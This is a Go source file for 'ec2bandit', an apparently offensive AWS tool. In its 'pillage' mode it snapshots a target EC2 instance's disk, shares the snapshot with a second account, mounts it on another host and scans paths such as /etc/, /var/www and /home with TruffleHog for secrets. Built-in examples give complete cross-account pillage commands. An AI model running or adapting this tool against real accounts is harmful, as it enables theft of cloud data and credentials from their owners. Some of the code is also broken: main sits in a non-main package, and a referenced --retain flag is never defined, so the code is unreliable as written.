package ec2bandit

import (
	"context"
	"flag"
	"fmt"
	"os"

	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/sts"
	
	"ec2bandit/internal/config"
	"ec2bandit/pkg/aws"
	"ec2bandit/pkg/banner"
	"ec2bandit/pkg/trufflehog"
	"ec2bandit/pkg/utils"
)

// Execute runs the main ec2bandit functionality
func Execute() error {
	cfg := &config.Config{}

	// Command line flags
	flag.StringVar(&cfg.SrcProfile, "src-profile", "", "Source AWS profile")
	flag.StringVar(&cfg.DstProfile, "dst-profile", "", "Destination AWS profile")
	flag.StringVar(&cfg.SrcRegion, "src-region", "", "Source AWS region")
	flag.StringVar(&cfg.DstRegion, "dst-region", "", "Destination AWS region")
	flag.StringVar(&cfg.MountPath, "mount-path", "", "Mount path for the volume")
	flag.BoolVar(&cfg.Pillage, "pillage", false, "Enable pillage mode")
	flag.StringVar(&cfg.SSHKeyPath, "ssh-key-path", "", "Path to SSH key")
	flag.StringVar(&cfg.TargetEC2, "target-ec2", "", "Target EC2 instance ID")
	flag.StringVar(&cfg.MountHost, "mount-host", "", "Mount host instance ID")
	flag.StringVar(&cfg.PillagePath, "pillage-path", "", "Path to pillage")
	flag.StringVar(&cfg.OutFile, "out-file", "", "Output file path")
	flag.BoolVar(&cfg.JSON, "json", false, "Output in JSON format")
	flag.BoolVar(&cfg.Debug, "debug", false, "Enable debug logging")
	flag.BoolVar(&cfg.NoBanner, "no-banner", false, "Disable banner display")
	flag.BoolVar(&cfg.ShowExamples, "examples", false, "Show example commands")

	flag.Parse()

	// If examples flag is set, show examples and exit
	if cfg.ShowExamples {
		showExamples()
		return nil
	}

	// Print banner unless disabled
	banner.Print(cfg.NoBanner)

	// If -no-banner was passed, clear the screen
	if cfg.NoBanner {
		fmt.Print("\033[H\033[2J")
	}

	// Initialize logging with debug flag
	if err := utils.InitLogging(cfg.Debug); err != nil {
		return fmt.Errorf("failed to initialize logging: %v", err)
	}

	utils.Debug("Configuration: %+v", cfg)

	// Validate configuration
	if err := utils.ValidateConfig(cfg); err != nil {
		return fmt.Errorf("configuration validation failed: %v", err)
	}

	return run(cfg)
}

func main() {
	if err := Execute(); err != nil {
		utils.Error("Application failed: %v", err)
		os.Exit(1)
	}
}

func run(cfg *config.Config) error {
	ctx := context.Background()
	utils.Info("Starting ec2bandit...")
	utils.Debug("Initializing AWS services...")

	// Initialize AWS services
	services, err := aws.NewServices(cfg)
	if err != nil {
		return fmt.Errorf("failed to initialize AWS services: %w", err)
	}

	scanner := trufflehog.NewScanner(services.SSMOps)

	if cfg.Pillage {
		utils.Info("Running in pillage mode for instance %s", cfg.TargetEC2)
		utils.Debug("Creating snapshot of target instance...")
		
		// Create snapshot of the target instance
		snapshotID, kmsKeyID, err := services.EBSOps.CreateSnapshot(ctx, cfg.TargetEC2)
		if err != nil {
			return fmt.Errorf("failed to create snapshot: %w", err)
		}
		utils.Info("Created snapshot: %s", snapshotID)

		// Handle encrypted vs unencrypted cases
		if kmsKeyID != "" {
			utils.Debug("Handling encrypted snapshot...")
			if err := handleEncryptedSnapshot(ctx, cfg, services, scanner, snapshotID, kmsKeyID); err != nil {
				return fmt.Errorf("failed to handle encrypted snapshot: %w", err)
			}
		} else {
			utils.Debug("Handling unencrypted snapshot...")
			if err := handleUnencryptedSnapshot(ctx, cfg, services, scanner, snapshotID); err != nil {
				return fmt.Errorf("failed to handle unencrypted snapshot: %w", err)
			}
		}
	} else {
		utils.Info("Listing available EBS volumes...")
		if err := services.EBSOps.ListVolumes(ctx); err != nil {
			return fmt.Errorf("failed to list volumes: %w", err)
		}
	}

	utils.Info("Operation completed successfully")
	return nil
}

func handleEncryptedSnapshot(ctx context.Context, cfg *config.Config, services *aws.Services, scanner *trufflehog.Scanner, snapshotID, kmsKeyID string) error {
	// TODO: Implement encrypted snapshot handling
	return fmt.Errorf("encrypted snapshot handling not yet implemented")
}

func handleUnencryptedSnapshot(ctx context.Context, cfg *config.Config, services *aws.Services, scanner *trufflehog.Scanner, snapshotID string) error {
	utils.Debug("Creating volume from unencrypted snapshot...")
	
	// Always share the snapshot with the destination account
	utils.Debug("Sharing snapshot between accounts...")
	
	// Get destination account ID
	dstAccountID, err := services.DstClient.STS.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})
	if err != nil {
		return fmt.Errorf("failed to get destination account ID: %w", err)
	}

	// Share snapshot with destination account
	if err := services.EBSOps.ShareSnapshot(ctx, snapshotID, *dstAccountID.Account); err != nil {
		return fmt.Errorf("failed to share snapshot: %w", err)
	}
	utils.Info("Shared snapshot with account: %s", *dstAccountID.Account)

	// Get the availability zone of the mount host
	instanceResp, err := services.DstClient.EC2.DescribeInstances(ctx, &ec2.DescribeInstancesInput{
		InstanceIds: []string{cfg.MountHost},
	})
	if err != nil {
		return fmt.Errorf("failed to get mount host details: %w", err)
	}

	if len(instanceResp.Reservations) == 0 || len(instanceResp.Reservations[0].Instances) == 0 {
		return fmt.Errorf("mount host instance %s not found", cfg.MountHost)
	}

	az := *instanceResp.Reservations[0].Instances[0].Placement.AvailabilityZone

	// Create volume from snapshot
	volumeID, err := services.EBSOps.CreateVolumeFromSnapshot(ctx, snapshotID, az)
	if err != nil {
		return fmt.Errorf("failed to create volume: %w", err)
	}
	utils.Info("Created volume: %s", volumeID)

	// Attach volume to mount host
	utils.Debug("Attaching volume to mount host...")
	deviceName, err := services.EBSOps.AttachVolume(ctx, volumeID, cfg.MountHost, "/dev/xvdf")
	if err != nil {
		return fmt.Errorf("failed to attach volume: %w", err)
	}
	utils.Info("Volume attached successfully at %s", deviceName)

	// Mount volume and run Trufflehog
	utils.Debug("Running Trufflehog scan...")
	if err := scanner.ScanVolume(ctx, cfg.MountHost, cfg.MountPath, cfg.PillagePath, deviceName, cfg.JSON); err != nil {
		return fmt.Errorf("failed to scan volume: %w", err)
	}

	// Save scan output if output file is specified
	if cfg.OutFile != "" {
		if err := scanner.SaveOutput(ctx, cfg.MountHost, cfg.OutFile); err != nil {
			return fmt.Errorf("failed to save scan output: %w", err)
		}
		utils.Info("Scan output saved to: %s", cfg.OutFile)
	}

	// Clean up resources if not retaining them
	if !cfg.Retain {
		utils.Debug("Cleaning up resources...")
		
		// Detach volume
		if err := services.EBSOps.DetachVolume(ctx, volumeID); err != nil {
			utils.Debug("Failed to detach volume: %v", err)
		}

		// Delete snapshot and volume
		if err := services.EBSOps.DeleteSnapshotAndVolume(ctx, snapshotID, "", volumeID); err != nil {
			return fmt.Errorf("failed to clean up resources: %w", err)
		}
		utils.Info("Resources cleaned up successfully")
	}

	return nil
}

// showExamples displays example commands for using ec2bandit
func showExamples() {
	examples := `Example Commands for ec2bandit:

1. Basic Usage (Same Account):
   Pillage a target EC2 instance's root volume in the same AWS account:
   go run ec2bandit.go \
       --src-profile myprofile \
       --dst-profile myprofile \
       --src-region us-east-1 \
       --dst-region us-east-1 \
       --mount-path /mnt/target \
       --pillage \
       --ssh-key-path ~/.ssh/mykey.pem \
       --target-ec2 i-0123456789abcdef0 \
       --mount-host i-0123456789abcdef1 \
       --pillage-path /etc/

2. Cross-Account Usage:
   Pillage a target EC2 instance's root volume across different AWS accounts:
   go run ec2bandit.go \
       --src-profile source-account \
       --dst-profile dest-account \
       --src-region us-east-1 \
       --dst-region us-east-1 \
       --mount-path /mnt/target \
       --pillage \
       --ssh-key-path ~/.ssh/mykey.pem \
       --target-ec2 i-0123456789abcdef0 \
       --mount-host i-0123456789abcdef1 \
       --pillage-path /var/www \
       --json \
       --out-file results.json

3. Debug Mode:
   Run with debug logging enabled:
   go run ec2bandit.go \
       --src-profile myprofile \
       --dst-profile myprofile \
       --src-region us-east-1 \
       --dst-region us-east-1 \
       --mount-path /mnt/target \
       --pillage \
       --ssh-key-path ~/.ssh/mykey.pem \
       --target-ec2 i-0123456789abcdef0 \
       --mount-host i-0123456789abcdef1 \
       --pillage-path /home \
       --debug

4. Retain Resources:
   Keep snapshots and volumes after pillaging:
   go run ec2bandit.go \
       --src-profile myprofile \
       --dst-profile myprofile \
       --src-region us-east-1 \
       --dst-region us-east-1 \
       --mount-path /mnt/target \
       --pillage \
       --ssh-key-path ~/.ssh/mykey.pem \
       --target-ec2 i-0123456789abcdef0 \
       --mount-host i-0123456789abcdef1 \
       --pillage-path /opt \
       --retain

5. List EBS Volumes:
   List available EBS volumes in the destination account:
   go run ec2bandit.go \
       --dst-profile myprofile \
       --dst-region us-east-1

Note: Replace profile names, regions, instance IDs, and paths with your actual values.
`
	fmt.Println(examples)
} 